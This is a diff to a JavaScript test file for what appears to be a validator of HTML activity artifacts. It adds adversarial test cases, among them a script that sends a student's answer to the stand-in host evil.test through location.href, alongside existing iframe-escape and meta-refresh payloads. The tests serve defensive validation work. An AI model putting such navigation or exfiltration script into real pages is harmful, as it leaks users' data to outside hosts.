@@ -114,6 +114,8 @@ describe("activity artifact contracts", () => {
     ["template descendants", "<template><iframe srcdoc='<p>escape</p>'></iframe></template>", "nested browsing contexts are forbidden"],
     ["script markup string", "<script>document.body.insertAdjacentHTML('beforeend', '<iframe srcdoc=\"<p>escape</p>\"></iframe>')</script>", "nested browsing contexts are forbidden"],
     ["meta navigation", "<meta http-equiv='refresh' content='0;url=https://evil.test'>", "meta refresh is forbidden"],
+    ["self navigation", "<script>location.href = 'https' + '://evil.test/?a=' + answer</script>", "self-navigation is forbidden"],
+    ["window navigation", "<script>window['location'].assign('/replacement')</script>", "self-navigation is forbidden"],
   ])("rejects adversarial %s artifacts with a specific reason", (_name, payload, reason) => {
     const context = buildActivitySessionContext([lessonState]);
     const [candidate] = createActivityArtifactCandidates({
@@ -156,7 +158,7 @@ describe("activity artifact contracts", () => {
     });
     candidate.bundle_html = candidate.bundle_html.replace(
       "</body>",
-      '<img srcset="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs= 1x, asset.png 2x" alt="Punto"> </body>',
+      '<img srcset="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=, asset.png 2x" alt="Punto"> </body>',
     );
 
     const result = verifyActivityArtifact(candidate);
